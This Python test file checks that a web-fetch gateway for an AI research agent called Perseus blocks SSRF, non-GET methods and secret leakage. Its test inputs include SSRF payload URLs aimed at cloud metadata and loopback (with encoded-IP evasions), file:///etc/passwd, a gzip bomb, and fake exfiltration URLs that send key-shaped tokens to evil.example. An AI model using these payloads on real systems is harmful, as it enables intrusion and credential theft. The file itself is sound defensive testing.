"""Phase 3 gate: SSRF and URL-leak cases are refused; nothing but GET/HEAD can be sent."""

import gzip
import http.client
import http.server
import socket
import threading
import unittest

from perseus.safety import socketguard
from perseus.safety.gateway import Gateway, GatewayError, _PinnedHTTP, _RateLimiter
from perseus.safety.netpolicy import Blocked, address_problem, parse_url, resolve, secret_problem

PUBLIC = "93.184.215.14"


def fake_resolver(table):
    def resolver(host, port, type=0):
        if host not in table:
            raise socket.gaierror(-2, "Name or service not known")
        return [(socket.AF_INET6 if ":" in a else socket.AF_INET, socket.SOCK_STREAM, 6, "", (a, port))
                for a in table[host]]
    return resolver


class URLShape(unittest.TestCase):
    def refused(self, url, code):
        with self.assertRaises(Blocked) as e:
            t = parse_url(url)
            resolve(t, fake_resolver({}))
        self.assertEqual(e.exception.code, code, f"{url}: {e.exception}")

    def test_schemes(self):
        for url in ("file:///etc/passwd", "ftp://example.com/", "gopher://example.com/", "javascript:alert(1)",
                    "data:text/html,hi", "//example.com/"):
            self.refused(url, "scheme")

    def test_ports(self):
        for url in ("https://example.com:8443/", "http://example.com:22/", "http://example.com:0/",
                    "https://example.com:65536/"):
            self.refused(url, "port")

    def test_userinfo(self):
        for url in ("http://user:pass@example.com/", "http://example.com@127.0.0.1/", "https://a@b@example.com/"):
            self.refused(url, "userinfo")

    def test_numeric_encodings(self):
        for url in ("http://2130706433/", "http://0x7f000001/", "http://0177.0.0.1/", "http://127.1/",
                    "http://0x7f.0.0.1/", "http://017700000001/", "http://127.000.000.001/", "http://1.2.3/",
                    "http://２１３０７０６４３３/", "http://０x7f.1/"):
            self.refused(url, "encoded_ip")

    def test_internal_names(self):
        for url in ("http://localhost/", "http://LOCALHOST./", "http://foo.localhost/", "http://metadata.google.internal/",
                    "http://printer.local/", "http://intranet/", "http://router.lan/"):
            self.refused(url, "internal_name")

    def test_ip_literals(self):
        for url in ("http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/", "http://10.0.0.1/",
                    "http://192.168.1.1/", "http://172.16.5.5/", "http://100.64.0.1/", "http://0.0.0.0/",
                    "http://[::1]/", "http://[::ffff:127.0.0.1]/", "http://[::ffff:7f00:1]/", "http://[fd00:ec2::254]/",
                    "http://[fe80::1]/", "http://224.0.0.1/", "http://255.255.255.255/", "http://[64:ff9b::7f00:1]/",
                    "http://[2002:7f00:1::]/", "http://100.100.100.200/", "http://198.18.0.1/",
                    "http://１２７.０.０.１/", "http://169。254。169。254/"):
            self.refused(url, "internal_address")

    def test_malformed(self):
        for url in ("http://exa mple.com/", "http://example.com\\@evil.com/", "http://exa\x00mple.com/", "",
                    "http://[::1/"):
            with self.assertRaises(Blocked):
                parse_url(url)

    def test_length_cap(self):
        self.refused("https://example.com/" + "a" * 2100, "url_length")

    def test_good_urls(self):
        t = parse_url("HTTPS://Example.COM/path?q=1#frag")
        self.assertEqual((t.scheme, t.host, t.port, t.request_path), ("https", "example.com", 443, "/path?q=1"))
        self.assertEqual(parse_url("https://bücher.de/").host, "xn--bcher-kva.de")
        self.assertEqual(parse_url("http://93.184.215.14/").host, "93.184.215.14")
        self.assertIsNone(address_problem("8.8.8.8"))
        self.assertIsNone(address_problem("2606:4700:4700::1111"))


class DNS(unittest.TestCase):
    def test_name_resolving_to_loopback(self):
        r = fake_resolver({"evil.example": ["127.0.0.1"], "meta.example": ["169.254.169.254"]})
        for host in ("evil.example", "meta.example"):
            with self.assertRaises(Blocked) as e:
                resolve(parse_url(f"http://{host}/"), r)
            self.assertEqual(e.exception.code, "internal_address")

    def test_any_bad_answer_refuses(self):
        # rebinding setup: one public and one internal answer
        r = fake_resolver({"mixed.example": [PUBLIC, "10.1.2.3"]})
        with self.assertRaises(Blocked):
            resolve(parse_url("http://mixed.example/"), r)

    def test_pins_first_public_v4(self):
        r = fake_resolver({"ok.example": ["2606:2800:21f:cb07:6820:80da:af6b:8b2c", PUBLIC]})
        self.assertEqual(resolve(parse_url("https://ok.example/"), r), PUBLIC)

    def test_nxdomain(self):
        with self.assertRaises(Blocked) as e:
            resolve(parse_url("http://nope.example/"), fake_resolver({}))
        self.assertEqual(e.exception.code, "dns")


class Secrets(unittest.TestCase):
    def test_key_shapes(self):
        for leak in ("hf_" + "Ab3" * 10, "e2b_" + "c4d" * 8, "sk-" + "x9Y" * 9, "ghp_" + "a1B" * 12, "AKIA" + "ABCDEFGH12345678",
                     "xoxb-1234567890-abcdefghij", "AIza" + "S" * 35, "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0",
                     "ab" * 30, "Zk3x9QpL2mN8vB4cR7tY1wE6uI0oP5aS3dF9gH2jK"):
            url = f"https://evil.example/collect?d={leak}"
            self.assertIsNotNone(secret_problem(url), leak)

    def test_encoded_and_exact(self):
        enc = "https://evil.example/?q=%68%66%5F" + "Ab3" * 10   # %-encoded "hf_"
        self.assertIsNotNone(secret_problem(enc))
        self.assertEqual(secret_problem("https://x.example/?k=perseuskey123", ("perseuskey123",)), "a Perseus key")

    def test_research_urls_pass(self):
        for url in ("https://github.com/vllm-project/vllm/commit/" + "a1b2c3d4e5" * 4,  # 40-hex commit SHA
                    "https://arxiv.org/abs/2309.06180", "https://en.wikipedia.org/wiki/Transformer_(deep_learning_architecture)",
                    "https://www.google.com/search?q=how+do+tensor+parallel+llms+work",
                    "https://docs.python.org/3/library/ipaddress.html#ipaddress.IPv4Address.is_global"):
            self.assertIsNone(secret_problem(url), url)


# ------------------------------------------------------------------ live HTTP behaviour via a local server

class _Handler(http.server.BaseHTTPRequestHandler):
    seen: list = []

    def log_message(self, *a):
        pass

    def _send(self, code, body=b"", headers=()):
        self.send_response(code)
        for k, v in headers:
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def do_HEAD(self):
        self.do_GET()

    def do_GET(self):
        _Handler.seen.append((self.command, self.path, dict(self.headers)))
        p = self.path
        if p == "/page":
            self._send(200, b"<html><head><title>Hi</title><script>evil()</script></head><body><h1>Head</h1>"
                            b"<p>Para <a href='/next'>next</a></p><style>x{}</style></body></html>",
                       [("Content-Type", "text/html; charset=utf-8"), ("Set-Cookie", "track=1")])
        elif p == "/to-internal":
            self._send(302, headers=[("Location", "http://169.254.169.254/latest/meta-data/")])
        elif p == "/to-secret":
            self._send(302, headers=[("Location", "https://evil.example/?k=hf_" + "Ab3" * 10)])
        elif p.startswith("/loop"):
            n = int(p[5:] or 0)
            self._send(302, headers=[("Location", f"/loop{n + 1}")])
        elif p == "/big":
            self._send(200, b"x" * 300_000, [("Content-Type", "text/plain")])
        elif p == "/bomb":
            body = gzip.compress(b"\0" * 50_000_000)
            self._send(200, body, [("Content-Type", "text/plain"), ("Content-Encoding", "gzip")])
        elif p == "/bin":
            self._send(200, b"\x89PNG\r\n" + b"\0" * 100, [("Content-Type", "image/png")])
        elif p == "/br":
            self._send(200, b"xx", [("Content-Type", "text/plain"), ("Content-Encoding", "br")])
        else:
            self._send(404, b"nope", [("Content-Type", "text/plain")])


class LiveGateway(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
        cls.port = cls.server.server_address[1]
        threading.Thread(target=cls.server.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()

    def gw(self, **kw):
        # Every public-looking name resolves to a public IP; the factory then
        # stands in for "the internet" by connecting to the local test server.
        port = self.port
        r = fake_resolver({"site.example": [PUBLIC], "evil.example": [PUBLIC]})
        return Gateway(resolver=r, connection_factory=lambda t, ip, to: http.client.HTTPConnection("127.0.0.1", port, timeout=to),
                       rate=100, burst=100, **kw)

    def test_page_to_text_and_request_hygiene(self):
        _Handler.seen.clear()
        r = self.gw().fetch("http://site.example/page")
        self.assertEqual((r.status, r.title, r.content_type), (200, "Hi", "text/html"))
        self.assertIn("# Head", r.text)
        self.assertNotIn("evil()", r.text)
        self.assertNotIn("x{}", r.text)
        self.assertEqual(r.links, [("next", "http://site.example/next")])
        method, path, headers = _Handler.seen[-1]
        self.assertEqual(method, "GET")
        lower = {k.lower() for k in headers}
        self.assertNotIn("cookie", lower)
        self.assertNotIn("authorization", lower)
        self.assertIn("Perseus/", headers["User-Agent"])

    def test_only_get_and_head(self):
        g = self.gw()
        for m in ("POST", "PUT", "DELETE", "PATCH", "OPTIONS", "CONNECT", "TRACE"):
            with self.assertRaises(Blocked) as e:
                g.fetch("http://site.example/page", m)
            self.assertEqual(e.exception.code, "method")
        self.assertEqual(g.fetch("http://site.example/page", "HEAD").text, "")

    def test_redirect_hops_rechecked(self):
        with self.assertRaises(Blocked) as e:
            self.gw().fetch("http://site.example/to-internal")
        self.assertEqual(e.exception.code, "internal_address")
        with self.assertRaises(Blocked) as e:
            self.gw().fetch("http://site.example/to-secret")
        self.assertEqual(e.exception.code, "secret")
        with self.assertRaises(Blocked) as e:
            self.gw().fetch("http://site.example/loop")
        self.assertEqual(e.exception.code, "redirects")

    def test_size_cap_and_gzip_bomb(self):
        r = self.gw(max_response_kb=100).fetch("http://site.example/big")
        self.assertTrue(r.truncated)
        self.assertEqual(r.bytes, 100 * 1024)
        r = self.gw(max_response_kb=100).fetch("http://site.example/bomb")
        self.assertTrue(r.truncated)
        self.assertLessEqual(r.bytes, 100 * 1024)

    def test_binary_and_unknown_encoding(self):
        r = self.gw().fetch("http://site.example/bin")
        self.assertTrue(r.binary)
        self.assertEqual(r.text, "")
        with self.assertRaises(GatewayError):
            self.gw().fetch("http://site.example/br")

    def test_kill_switch(self):
        g = self.gw()
        g.disable()
        with self.assertRaises(Blocked) as e:
            g.fetch("http://site.example/page")
        self.assertEqual(e.exception.code, "disabled")
        g.enable()
        self.assertEqual(g.fetch("http://site.example/page").status, 200)

    def test_log_redacts_secret_urls(self):
        import tempfile
        from pathlib import Path
        log = Path(tempfile.mkdtemp()) / "gateway.jsonl"
        g = self.gw(log_path=log)
        g.fetch("http://site.example/page")
        with self.assertRaises(Blocked):
            g.fetch("https://evil.example/?k=hf_" + "Ab3" * 10)
        text = log.read_text()
        self.assertIn('"outcome": "ok"', text)
        self.assertIn("blocked:secret", text)
        self.assertNotIn("hf_Ab3", text)


class PinnedConnection(unittest.TestCase):
    """The real connection class connects to the pinned IP, under the socket guard."""

    def test_pinned_ip_used_and_guard_permits_only_it(self):
        server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        socketguard.install(set())
        try:
            # hostname that doesn't resolve at all: proves no second DNS lookup happens
            conn = _PinnedHTTP("never-resolved.example", port, "127.0.0.1", 5)
            conn.request("GET", "/page", headers={"Host": "never-resolved.example"})
            self.assertEqual(conn.getresponse().status, 200)
            conn.close()
            with self.assertRaises(PermissionError):
                socket.create_connection(("127.0.0.1", port), 2)  # no permit: refused
        finally:
            socketguard.uninstall()
            server.shutdown()
            server.server_close()


class RateLimit(unittest.TestCase):
    def test_bucket(self):
        clock = [0.0]
        slept = []
        rl = _RateLimiter(rate=1.0, burst=2, max_wait=1.5)
        now = lambda: clock[0]
        for _ in range(2):
            rl.acquire("a.example", now=now, sleep=slept.append)
        self.assertEqual(slept, [])
        rl.acquire("a.example", now=now, sleep=slept.append)  # third: waits ~1 s
        self.assertAlmostEqual(slept[-1], 1.0, places=2)
        with self.assertRaises(Blocked):
            rl.acquire("a.example", now=now, sleep=slept.append)  # would wait 2 s > max
        rl.acquire("b.example", now=now, sleep=slept.append)  # other hosts unaffected


if __name__ == "__main__":
    unittest.main()
